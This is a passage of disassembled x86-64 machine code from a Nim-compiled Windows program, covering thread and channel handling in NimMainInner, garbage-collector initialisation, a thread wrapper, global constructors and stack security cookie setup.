  406a29:	c6 05 78 44 02 00 00 	movb   $0x0,0x24478(%rip)        # 42aea8 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x68>
  406a30:	74 10                	je     406a42 <NimMainInner+0xb05>
  406a32:	eb 69                	jmp    406a9d <NimMainInner+0xb60>
  406a34:	48 8d 0d 5d 44 02 00 	lea    0x2445d(%rip),%rcx        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  406a3b:	e8 09 af ff ff       	call   401949 <waitSysCond__1aSBSEAel8lRFkufku8IRA.constprop.24>
  406a40:	eb d4                	jmp    406a16 <NimMainInner+0xad9>
  406a42:	48 8b 15 f7 43 02 00 	mov    0x243f7(%rip),%rdx        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  406a49:	48 ff c8             	dec    %rax
  406a4c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  406a52:	4d 89 e8             	mov    %r13,%r8
  406a55:	49 0f af 55 00       	imul   0x0(%r13),%rdx
  406a5a:	48 89 05 ef 43 02 00 	mov    %rax,0x243ef(%rip)        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  406a61:	48 03 15 00 44 02 00 	add    0x24400(%rip),%rdx        # 42ae68 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x28>
  406a68:	48 8d 0d c9 e5 01 00 	lea    0x1e5c9(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  406a6f:	e8 92 ec ff ff       	call   405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22>
  406a74:	48 8b 05 c5 43 02 00 	mov    0x243c5(%rip),%rax        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  406a7b:	48 ff c0             	inc    %rax
  406a7e:	48 23 05 d3 43 02 00 	and    0x243d3(%rip),%rax        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  406a85:	48 89 05 b4 43 02 00 	mov    %rax,0x243b4(%rip)        # 42ae40 <mainThread__B7bJyClR3J8biZ7mpTlhzA>
  406a8c:	48 8b 05 cd 43 02 00 	mov    0x243cd(%rip),%rax        # 42ae60 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x20>
  406a93:	48 85 c0             	test   %rax,%rax
  406a96:	7f 7e                	jg     406b16 <NimMainInner+0xbd9>
  406a98:	e9 92 00 00 00       	jmp    406b2f <NimMainInner+0xbf2>
  406a9d:	48 8d 0d cc 43 02 00 	lea    0x243cc(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  406aa4:	ff d5                	call   *%rbp
  406aa6:	48 8d 0d 73 e6 01 00 	lea    0x1e673(%rip),%rcx        # 425120 <NTI__Ie1m0dv1ZHg72IgPRr1cDw_>
  406aad:	ba 30 00 00 00       	mov    $0x30,%edx
  406ab2:	e8 2f d2 ff ff       	call   403ce6 <newObj>
  406ab7:	48 8d 0d c2 ab 00 00 	lea    0xabc2(%rip),%rcx        # 411680 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_46>
  406abe:	48 89 c3             	mov    %rax,%rbx
  406ac1:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  406ac5:	48 8d 05 34 e7 01 00 	lea    0x1e734(%rip),%rax        # 425200 <NTI__yoNlBGx0D2tRizIdhQuENw_>
  406acc:	48 89 03             	mov    %rax,(%rbx)
  406acf:	48 8d 05 ac 57 00 00 	lea    0x57ac(%rip),%rax        # 40c282 <.rdata+0x282>
  406ad6:	48 89 43 10          	mov    %rax,0x10(%rbx)
  406ada:	e8 61 d1 ff ff       	call   403c40 <copyStringRC1>
  406adf:	48 85 f6             	test   %rsi,%rsi
  406ae2:	48 89 43 18          	mov    %rax,0x18(%rbx)
  406ae6:	74 08                	je     406af0 <NimMainInner+0xbb3>
  406ae8:	48 89 f1             	mov    %rsi,%rcx
  406aeb:	e8 41 c4 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.79>
  406af0:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  406af7:	00 00 
  406af9:	4c 8d 0d 45 56 00 00 	lea    0x5645(%rip),%r9        # 40c145 <.rdata+0x145>
  406b00:	48 89 d9             	mov    %rbx,%rcx
  406b03:	4c 8d 05 45 56 00 00 	lea    0x5645(%rip),%r8        # 40c14f <.rdata+0x14f>
  406b0a:	48 8d 15 71 57 00 00 	lea    0x5771(%rip),%rdx        # 40c282 <.rdata+0x282>
  406b11:	e8 a2 e7 ff ff       	call   4052b8 <raiseExceptionEx>
  406b16:	48 ff c8             	dec    %rax
  406b19:	48 39 05 30 43 02 00 	cmp    %rax,0x24330(%rip)        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  406b20:	75 0d                	jne    406b2f <NimMainInner+0xbf2>
  406b22:	48 8b 0d 6f 43 02 00 	mov    0x2436f(%rip),%rcx        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  406b29:	ff 15 09 43 02 00    	call   *0x24309(%rip)        # 42ae38 <Dl_1285039_>
  406b2f:	c6 05 fa e4 01 00 01 	movb   $0x1,0x1e4fa(%rip)        # 425030 <channel__N5eXcSZk9cFx3Xyn4EpWNYw>
  406b36:	48 8d 0d 33 43 02 00 	lea    0x24333(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  406b3d:	ff d5                	call   *%rbp
  406b3f:	80 3d ea e4 01 00 00 	cmpb   $0x0,0x1e4ea(%rip)        # 425030 <channel__N5eXcSZk9cFx3Xyn4EpWNYw>
  406b46:	0f 84 5d fe ff ff    	je     4069a9 <NimMainInner+0xa6c>
  406b4c:	ba 08 00 00 00       	mov    $0x8,%edx
  406b51:	48 89 d9             	mov    %rbx,%rcx
  406b54:	e8 69 ae ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  406b59:	48 8b 0d d8 e4 01 00 	mov    0x1e4d8(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  406b60:	e8 5e d5 ff ff       	call   4040c3 <copyString>
  406b65:	48 8d 0d 94 e4 01 00 	lea    0x1e494(%rip),%rcx        # 425000 <echoLock__N6SWfXRvlztVlLUFTGu6OQ>
  406b6c:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
  406b73:	00 
  406b74:	41 ff d7             	call   *%r15
  406b77:	48 8b bc 24 a0 00 00 	mov    0xa0(%rsp),%rdi
  406b7e:	00 
  406b7f:	b9 01 00 00 00       	mov    $0x1,%ecx
  406b84:	4c 8b 25 75 45 00 00 	mov    0x4575(%rip),%r12        # 40b100 <__imp___acrt_iob_func>
  406b8b:	41 ff d4             	call   *%r12
  406b8e:	49 89 c6             	mov    %rax,%r14
  406b91:	48 89 f9             	mov    %rdi,%rcx
  406b94:	e8 b8 a9 ff ff       	call   401551 <nimToCStringConv.lto_priv.52>
  406b99:	48 8d 15 ed 56 00 00 	lea    0x56ed(%rip),%rdx        # 40c28d <.rdata+0x28d>
  406ba0:	4c 89 f1             	mov    %r14,%rcx
  406ba3:	49 89 c0             	mov    %rax,%r8
  406ba6:	e8 85 18 00 00       	call   408430 <fprintf>
  406bab:	89 c6                	mov    %eax,%esi
  406bad:	31 d2                	xor    %edx,%edx
  406baf:	48 85 ff             	test   %rdi,%rdi
  406bb2:	48 63 c6             	movslq %esi,%rax
  406bb5:	74 03                	je     406bba <NimMainInner+0xc7d>
  406bb7:	48 8b 17             	mov    (%rdi),%rdx
  406bba:	48 39 c2             	cmp    %rax,%rdx
  406bbd:	7e 35                	jle    406bf4 <NimMainInner+0xcb7>
  406bbf:	80 7c 07 10 00       	cmpb   $0x0,0x10(%rdi,%rax,1)
  406bc4:	75 12                	jne    406bd8 <NimMainInner+0xc9b>
  406bc6:	31 c9                	xor    %ecx,%ecx
  406bc8:	4c 89 f2             	mov    %r14,%rdx
  406bcb:	e8 78 1a 00 00       	call   408648 <fputc>
  406bd0:	85 c0                	test   %eax,%eax
  406bd2:	75 20                	jne    406bf4 <NimMainInner+0xcb7>
  406bd4:	ff c6                	inc    %esi
  406bd6:	eb d5                	jmp    406bad <NimMainInner+0xc70>
  406bd8:	4c 8d 44 07 10       	lea    0x10(%rdi,%rax,1),%r8
  406bdd:	4c 89 f1             	mov    %r14,%rcx
  406be0:	48 8d 15 a6 56 00 00 	lea    0x56a6(%rip),%rdx        # 40c28d <.rdata+0x28d>
  406be7:	e8 44 18 00 00       	call   408430 <fprintf>
  406bec:	85 c0                	test   %eax,%eax
  406bee:	7e 04                	jle    406bf4 <NimMainInner+0xcb7>
  406bf0:	01 c6                	add    %eax,%esi
  406bf2:	eb b9                	jmp    406bad <NimMainInner+0xc70>
  406bf4:	b9 01 00 00 00       	mov    $0x1,%ecx
  406bf9:	41 ff d4             	call   *%r12
  406bfc:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  406c02:	ba 01 00 00 00       	mov    $0x1,%edx
  406c07:	48 8d 0d 5e 54 00 00 	lea    0x545e(%rip),%rcx        # 40c06c <.rdata+0x6c>
  406c0e:	49 89 c1             	mov    %rax,%r9
  406c11:	e8 0a 18 00 00       	call   408420 <fwrite>
  406c16:	b9 01 00 00 00       	mov    $0x1,%ecx
  406c1b:	41 ff d4             	call   *%r12
  406c1e:	48 89 c1             	mov    %rax,%rcx
  406c21:	e8 12 18 00 00       	call   408438 <fflush>
  406c26:	48 8d 0d d3 e3 01 00 	lea    0x1e3d3(%rip),%rcx        # 425000 <echoLock__N6SWfXRvlztVlLUFTGu6OQ>
  406c2d:	ff d5                	call   *%rbp
  406c2f:	e9 75 fd ff ff       	jmp    4069a9 <NimMainInner+0xa6c>
  406c34:	48 39 ca             	cmp    %rcx,%rdx
  406c37:	74 0d                	je     406c46 <NimMainInner+0xd09>
  406c39:	48 85 d2             	test   %rdx,%rdx
  406c3c:	74 08                	je     406c46 <NimMainInner+0xd09>
  406c3e:	48 ff c0             	inc    %rax
  406c41:	e9 c8 f4 ff ff       	jmp    40610e <NimMainInner+0x1d1>
  406c46:	49 8b 95 58 34 00 00 	mov    0x3458(%r13),%rdx
  406c4d:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
  406c51:	48 8b 7c c2 10       	mov    0x10(%rdx,%rax,8),%rdi
  406c56:	48 85 ff             	test   %rdi,%rdi
  406c59:	74 07                	je     406c62 <NimMainInner+0xd25>
  406c5b:	48 8b 07             	mov    (%rdi),%rax
  406c5e:	48 8d 70 ff          	lea    -0x1(%rax),%rsi
  406c62:	4c 8d 46 01          	lea    0x1(%rsi),%r8
  406c66:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
  406c6a:	4d 85 c0             	test   %r8,%r8
  406c6d:	7e 28                	jle    406c97 <NimMainInner+0xd5a>
  406c6f:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
  406c73:	ba 3d 00 00 00       	mov    $0x3d,%edx
  406c78:	e8 c3 19 00 00       	call   408640 <memchr>
  406c7d:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
  406c81:	48 85 c0             	test   %rax,%rax
  406c84:	49 89 c0             	mov    %rax,%r8
  406c87:	74 0e                	je     406c97 <NimMainInner+0xd5a>
  406c89:	48 89 f9             	mov    %rdi,%rcx
  406c8c:	e8 c0 a8 ff ff       	call   401551 <nimToCStringConv.lto_priv.52>
  406c91:	4c 89 c2             	mov    %r8,%rdx
  406c94:	48 29 c2             	sub    %rax,%rdx
  406c97:	48 ff c2             	inc    %rdx
  406c9a:	49 89 f0             	mov    %rsi,%r8
  406c9d:	48 89 f9             	mov    %rdi,%rcx
  406ca0:	e8 6e d1 ff ff       	call   403e13 <substr__2yh9cer0ymNRHlOOg8P7IuA>
  406ca5:	e9 e0 f4 ff ff       	jmp    40618a <NimMainInner+0x24d>
  406caa:	45 31 c0             	xor    %r8d,%r8d
  406cad:	48 85 c0             	test   %rax,%rax
  406cb0:	0f 85 f9 f4 ff ff    	jne    4061af <NimMainInner+0x272>
  406cb6:	e9 0f f6 ff ff       	jmp    4062ca <NimMainInner+0x38d>

0000000000406cbb <initGC__amVlU9ajqZ06ujoesRBHcDg>:
  406cbb:	53                   	push   %rbx
  406cbc:	48 83 ec 20          	sub    $0x20,%rsp
  406cc0:	e8 db af ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  406cc5:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406cca:	48 c7 40 40 00 00 40 	movq   $0x400000,0x40(%rax)
  406cd1:	00 
  406cd2:	48 89 c3             	mov    %rax,%rbx
  406cd5:	48 c7 40 48 f4 01 00 	movq   $0x1f4,0x48(%rax)
  406cdc:	00 
  406cdd:	48 c7 80 90 33 00 00 	movq   $0x0,0x3390(%rax)
  406ce4:	00 00 00 00 
  406ce8:	48 c7 80 98 33 00 00 	movq   $0x0,0x3398(%rax)
  406cef:	00 00 00 00 
  406cf3:	48 c7 80 a0 33 00 00 	movq   $0x0,0x33a0(%rax)
  406cfa:	00 00 00 00 
  406cfe:	48 c7 80 a8 33 00 00 	movq   $0x0,0x33a8(%rax)
  406d05:	00 00 00 00 
  406d09:	48 c7 80 b0 33 00 00 	movq   $0x0,0x33b0(%rax)
  406d10:	00 00 00 00 
  406d14:	48 c7 80 b8 33 00 00 	movq   $0x0,0x33b8(%rax)
  406d1b:	00 00 00 00 
  406d1f:	48 c7 40 50 00 00 00 	movq   $0x0,0x50(%rax)
  406d26:	00 
  406d27:	48 c7 40 58 00 04 00 	movq   $0x400,0x58(%rax)
  406d2e:	00 
  406d2f:	e8 2e c2 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406d34:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406d39:	48 c7 83 80 00 00 00 	movq   $0x0,0x80(%rbx)
  406d40:	00 00 00 00 
  406d44:	48 89 43 60          	mov    %rax,0x60(%rbx)
  406d48:	48 c7 83 88 00 00 00 	movq   $0x400,0x88(%rbx)
  406d4f:	00 04 00 00 
  406d53:	e8 0a c2 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406d58:	48 c7 43 68 00 00 00 	movq   $0x0,0x68(%rbx)
  406d5f:	00 
  406d60:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406d65:	48 89 83 90 00 00 00 	mov    %rax,0x90(%rbx)
  406d6c:	48 c7 43 70 00 04 00 	movq   $0x400,0x70(%rbx)
  406d73:	00 
  406d74:	e8 e9 c1 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406d79:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406d7e:	48 89 43 78          	mov    %rax,0x78(%rbx)
  406d82:	e8 db c1 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406d87:	b9 00 20 00 00       	mov    $0x2000,%ecx
  406d8c:	48 c7 83 d0 33 00 00 	movq   $0x3ff,0x33d0(%rbx)
  406d93:	ff 03 00 00 
  406d97:	48 89 83 e0 33 00 00 	mov    %rax,0x33e0(%rbx)
  406d9e:	48 c7 83 c8 33 00 00 	movq   $0x0,0x33c8(%rbx)
  406da5:	00 00 00 00 
  406da9:	48 c7 83 d8 33 00 00 	movq   $0x0,0x33d8(%rbx)
  406db0:	00 00 00 00 
  406db4:	48 c7 83 e8 33 00 00 	movq   $0x0,0x33e8(%rbx)
  406dbb:	00 00 00 00 
  406dbf:	48 c7 83 f0 33 00 00 	movq   $0x400,0x33f0(%rbx)
  406dc6:	00 04 00 00 
  406dca:	e8 93 c1 ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  406dcf:	48 8d 8b 10 34 00 00 	lea    0x3410(%rbx),%rcx
  406dd6:	48 89 83 f8 33 00 00 	mov    %rax,0x33f8(%rbx)
  406ddd:	ff 15 d1 14 04 00    	call   *0x414d1(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  406de3:	b8 01 00 00 00       	mov    $0x1,%eax
  406de8:	48 c7 83 00 34 00 00 	movq   $0x0,0x3400(%rbx)
  406def:	00 00 00 00 
  406df3:	48 c7 83 08 34 00 00 	movq   $0x0,0x3408(%rbx)
  406dfa:	00 00 00 00 
  406dfe:	f0 48 0f c1 05 39 d2 	lock xadd %rax,0xd239(%rip)        # 414040 <gHeapidGenerator__hd54mEUTGcVuZLChYgtR9bg>
  406e05:	00 00 
  406e07:	48 89 83 38 34 00 00 	mov    %rax,0x3438(%rbx)
  406e0e:	48 83 c4 20          	add    $0x20,%rsp
  406e12:	5b                   	pop    %rbx
  406e13:	c3                   	ret

0000000000406e14 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA>:
  406e14:	41 56                	push   %r14
  406e16:	41 55                	push   %r13
  406e18:	41 54                	push   %r12
  406e1a:	55                   	push   %rbp
  406e1b:	57                   	push   %rdi
  406e1c:	56                   	push   %rsi
  406e1d:	53                   	push   %rbx
  406e1e:	48 83 ec 30          	sub    $0x30,%rsp
  406e22:	48 8b 31             	mov    (%rcx),%rsi
  406e25:	49 89 cd             	mov    %rcx,%r13
  406e28:	48 89 f2             	mov    %rsi,%rdx
  406e2b:	8b 0d 77 2d 02 00    	mov    0x22d77(%rip),%ecx        # 429ba8 <globalsSlot__ciXDZu9c27pHpCRMoz4RIgw>
  406e31:	ff 15 ed 14 04 00    	call   *0x414ed(%rip)        # 448324 <__imp_TlsSetValue>
  406e37:	48 8d 05 1b e3 ff ff 	lea    -0x1ce5(%rip),%rax        # 405159 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2>
  406e3e:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  406e43:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  406e48:	e8 88 ae ff ff       	call   401cd5 <nimGC_setStackBottom>
  406e4d:	e8 69 fe ff ff       	call   406cbb <initGC__amVlU9ajqZ06ujoesRBHcDg>
  406e52:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  406e57:	4c 89 e9             	mov    %r13,%rcx
  406e5a:	ff d0                	call   *%rax
  406e5c:	e8 3f ae ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  406e61:	48 8d 98 a0 31 00 00 	lea    0x31a0(%rax),%rbx
  406e68:	48 89 c5             	mov    %rax,%rbp
  406e6b:	48 8b 03             	mov    (%rbx),%rax
  406e6e:	31 ff                	xor    %edi,%edi
  406e70:	4c 8b b3 e8 01 00 00 	mov    0x1e8(%rbx),%r14
  406e77:	4c 8d 60 ff          	lea    -0x1(%rax),%r12
  406e7b:	49 39 fc             	cmp    %rdi,%r12
  406e7e:	7d 11                	jge    406e91 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x7d>
  406e80:	4d 85 f6             	test   %r14,%r14
  406e83:	4c 89 f3             	mov    %r14,%rbx
  406e86:	75 e3                	jne    406e6b <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x57>
  406e88:	48 8b 8d 18 29 00 00 	mov    0x2918(%rbp),%rcx
  406e8f:	eb 16                	jmp    406ea7 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x93>
  406e91:	48 89 f8             	mov    %rdi,%rax
  406e94:	48 ff c7             	inc    %rdi
  406e97:	48 c1 e0 04          	shl    $0x4,%rax
  406e9b:	48 8b 4c 03 08       	mov    0x8(%rbx,%rax,1),%rcx
  406ea0:	e8 00 af ff ff       	call   401da5 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6>
  406ea5:	eb d4                	jmp    406e7b <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x67>
  406ea7:	48 85 c9             	test   %rcx,%rcx
  406eaa:	74 0e                	je     406eba <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0xa6>
  406eac:	48 8b 59 10          	mov    0x10(%rcx),%rbx
  406eb0:	e8 f0 ae ff ff       	call   401da5 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6>
  406eb5:	48 89 d9             	mov    %rbx,%rcx
  406eb8:	eb ed                	jmp    406ea7 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA+0x93>
  406eba:	48 c7 85 18 29 00 00 	movq   $0x0,0x2918(%rbp)
  406ec1:	00 00 00 00 
  406ec5:	48 8d 0d f4 2c 02 00 	lea    0x22cf4(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  406ecc:	49 c7 45 00 00 00 00 	movq   $0x0,0x0(%r13)
  406ed3:	00 
  406ed4:	49 c7 45 10 00 00 00 	movq   $0x0,0x10(%r13)
  406edb:	00 
  406edc:	ff 15 8a 13 04 00    	call   *0x4138a(%rip)        # 44826c <__imp_EnterCriticalSection>
  406ee2:	48 8d 56 f0          	lea    -0x10(%rsi),%rdx
  406ee6:	48 8d 0d 13 ae 01 00 	lea    0x1ae13(%rip),%rcx        # 421d00 <sharedHeap__R3bhvQCN0d6AYpkvxfT9aGw>
  406eed:	e8 22 b5 ff ff       	call   402414 <rawDealloc__K7uQ6aTKvW6OnOV8EMoNNQ>
  406ef2:	48 8d 0d c7 2c 02 00 	lea    0x22cc7(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  406ef9:	ff 15 bd 13 04 00    	call   *0x413bd(%rip)        # 4482bc <__imp_LeaveCriticalSection>
  406eff:	31 c0                	xor    %eax,%eax
  406f01:	48 83 c4 30          	add    $0x30,%rsp
  406f05:	5b                   	pop    %rbx
  406f06:	5e                   	pop    %rsi
  406f07:	5f                   	pop    %rdi
  406f08:	5d                   	pop    %rbp
  406f09:	41 5c                	pop    %r12
  406f0b:	41 5d                	pop    %r13
  406f0d:	41 5e                	pop    %r14
  406f0f:	c3                   	ret

0000000000406f10 <__do_global_dtors>:
  406f10:	48 83 ec 28          	sub    $0x28,%rsp
  406f14:	48 8b 05 85 41 00 00 	mov    0x4185(%rip),%rax        # 40b0a0 <p.93846>
  406f1b:	48 8b 00             	mov    (%rax),%rax
  406f1e:	48 85 c0             	test   %rax,%rax
  406f21:	74 1d                	je     406f40 <__do_global_dtors+0x30>
  406f23:	ff d0                	call   *%rax
  406f25:	48 8b 05 74 41 00 00 	mov    0x4174(%rip),%rax        # 40b0a0 <p.93846>
  406f2c:	48 8d 50 08          	lea    0x8(%rax),%rdx
  406f30:	48 8b 40 08          	mov    0x8(%rax),%rax
  406f34:	48 89 15 65 41 00 00 	mov    %rdx,0x4165(%rip)        # 40b0a0 <p.93846>
  406f3b:	48 85 c0             	test   %rax,%rax
  406f3e:	75 e3                	jne    406f23 <__do_global_dtors+0x13>
  406f40:	48 83 c4 28          	add    $0x28,%rsp
  406f44:	c3                   	ret
  406f45:	90                   	nop
  406f46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  406f4d:	00 00 00 

0000000000406f50 <__do_global_ctors>:
  406f50:	56                   	push   %rsi
  406f51:	53                   	push   %rbx
  406f52:	48 83 ec 28          	sub    $0x28,%rsp
  406f56:	48 8b 0d 63 ad 00 00 	mov    0xad63(%rip),%rcx        # 411cc0 <.refptr.__CTOR_LIST__>
  406f5d:	48 8b 11             	mov    (%rcx),%rdx
  406f60:	83 fa ff             	cmp    $0xffffffff,%edx
  406f63:	89 d0                	mov    %edx,%eax
  406f65:	74 39                	je     406fa0 <__do_global_ctors+0x50>
  406f67:	85 c0                	test   %eax,%eax
  406f69:	74 20                	je     406f8b <__do_global_ctors+0x3b>
  406f6b:	89 c2                	mov    %eax,%edx
  406f6d:	83 e8 01             	sub    $0x1,%eax
  406f70:	48 8d 1c d1          	lea    (%rcx,%rdx,8),%rbx
  406f74:	48 29 c2             	sub    %rax,%rdx
  406f77:	48 8d 74 d1 f8       	lea    -0x8(%rcx,%rdx,8),%rsi
  406f7c:	0f 1f 40 00          	nopl   0x0(%rax)
  406f80:	ff 13                	call   *(%rbx)
  406f82:	48 83 eb 08          	sub    $0x8,%rbx
  406f86:	48 39 f3             	cmp    %rsi,%rbx
  406f89:	75 f5                	jne    406f80 <__do_global_ctors+0x30>
  406f8b:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 406f10 <__do_global_dtors>
  406f92:	48 83 c4 28          	add    $0x28,%rsp
  406f96:	5b                   	pop    %rbx
  406f97:	5e                   	pop    %rsi
  406f98:	e9 73 a5 ff ff       	jmp    401510 <atexit>
  406f9d:	0f 1f 00             	nopl   (%rax)
  406fa0:	31 c0                	xor    %eax,%eax
  406fa2:	eb 02                	jmp    406fa6 <__do_global_ctors+0x56>
  406fa4:	89 d0                	mov    %edx,%eax
  406fa6:	44 8d 40 01          	lea    0x1(%rax),%r8d
  406faa:	4a 83 3c c1 00       	cmpq   $0x0,(%rcx,%r8,8)
  406faf:	4c 89 c2             	mov    %r8,%rdx
  406fb2:	75 f0                	jne    406fa4 <__do_global_ctors+0x54>
  406fb4:	eb b1                	jmp    406f67 <__do_global_ctors+0x17>
  406fb6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  406fbd:	00 00 00 

0000000000406fc0 <__main>:
  406fc0:	8b 05 7a 72 02 00    	mov    0x2727a(%rip),%eax        # 42e240 <initialized>
  406fc6:	85 c0                	test   %eax,%eax
  406fc8:	74 06                	je     406fd0 <__main+0x10>
  406fca:	c3                   	ret
  406fcb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  406fd0:	c7 05 66 72 02 00 01 	movl   $0x1,0x27266(%rip)        # 42e240 <initialized>
  406fd7:	00 00 00 
  406fda:	e9 71 ff ff ff       	jmp    406f50 <__do_global_ctors>
  406fdf:	90                   	nop

0000000000406fe0 <my_lconv_init>:
  406fe0:	48 ff 25 9d 13 04 00 	rex.W jmp *0x4139d(%rip)        # 448384 <__imp___lconv_init>
  406fe7:	90                   	nop
  406fe8:	90                   	nop
  406fe9:	90                   	nop
  406fea:	90                   	nop
  406feb:	90                   	nop
  406fec:	90                   	nop
  406fed:	90                   	nop
  406fee:	90                   	nop
  406fef:	90                   	nop

0000000000406ff0 <_setargv>:
  406ff0:	31 c0                	xor    %eax,%eax
  406ff2:	c3                   	ret
  406ff3:	90                   	nop
  406ff4:	90                   	nop
  406ff5:	90                   	nop
  406ff6:	90                   	nop
  406ff7:	90                   	nop
  406ff8:	90                   	nop
  406ff9:	90                   	nop
  406ffa:	90                   	nop
  406ffb:	90                   	nop
  406ffc:	90                   	nop
  406ffd:	90                   	nop
  406ffe:	90                   	nop
  406fff:	90                   	nop

0000000000407000 <__security_init_cookie>:
  407000:	41 54                	push   %r12
  407002:	55                   	push   %rbp
  407003:	57                   	push   %rdi
  407004:	56                   	push   %rsi
  407005:	53                   	push   %rbx
  407006:	48 83 ec 30          	sub    $0x30,%rsp
  40700a:	48 8b 1d 2f 41 00 00 	mov    0x412f(%rip),%rbx        # 40b140 <__security_cookie>
  407011:	48 b8 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rax
  407018:	2b 00 00 
  40701b:	48 39 c3             	cmp    %rax,%rbx
  40701e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  407025:	00 00 
  407027:	74 17                	je     407040 <__security_init_cookie+0x40>
  407029:	48 f7 d3             	not    %rbx
  40702c:	48 89 1d 1d 41 00 00 	mov    %rbx,0x411d(%rip)        # 40b150 <__security_cookie_complement>
  407033:	48 83 c4 30          	add    $0x30,%rsp
  407037:	5b                   	pop    %rbx
  407038:	5e                   	pop    %rsi
  407039:	5f                   	pop    %rdi
  40703a:	5d                   	pop    %rbp
  40703b:	41 5c                	pop    %r12
  40703d:	c3                   	ret
  40703e:	66 90                	xchg   %ax,%ax
  407040:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  407045:	ff 15 59 12 04 00    	call   *0x41259(%rip)        # 4482a4 <__imp_GetSystemTimeAsFileTime>
  40704b:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
  407050:	ff 15 26 12 04 00    	call   *0x41226(%rip)        # 44827c <__imp_GetCurrentProcessId>
  407056:	41 89 c4             	mov    %eax,%r12d
  407059:	ff 15 25 12 04 00    	call   *0x41225(%rip)        # 448284 <__imp_GetCurrentThreadId>
  40705f:	89 c5                	mov    %eax,%ebp
  407061:	ff 15 45 12 04 00    	call   *0x41245(%rip)        # 4482ac <__imp_GetTickCount>
  407067:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  40706c:	89 c7                	mov    %eax,%edi
  40706e:	ff 15 58 12 04 00    	call   *0x41258(%rip)        # 4482cc <__imp_QueryPerformanceCounter>
  407074:	48 33 74 24 28       	xor    0x28(%rsp),%rsi
  407079:	44 89 e0             	mov    %r12d,%eax
  40707c:	48 ba ff ff ff ff ff 	movabs $0xffffffffffff,%rdx
  407083:	ff 00 00 
  407086:	48 31 f0             	xor    %rsi,%rax
  407089:	89 ee                	mov    %ebp,%esi
  40708b:	48 31 c6             	xor    %rax,%rsi
  40708e:	89 f8                	mov    %edi,%eax
  407090:	48 31 f0             	xor    %rsi,%rax
  407093:	48 21 d0             	and    %rdx,%rax
  407096:	48 39 d8             	cmp    %rbx,%rax
  407099:	74 25                	je     4070c0 <__security_init_cookie+0xc0>
  40709b:	48 89 c2             	mov    %rax,%rdx
  40709e:	48 f7 d2             	not    %rdx
  4070a1:	48 89 05 98 40 00 00 	mov    %rax,0x4098(%rip)        # 40b140 <__security_cookie>
  4070a8:	48 89 15 a1 40 00 00 	mov    %rdx,0x40a1(%rip)        # 40b150 <__security_cookie_complement>
  4070af:	48 83 c4 30          	add    $0x30,%rsp
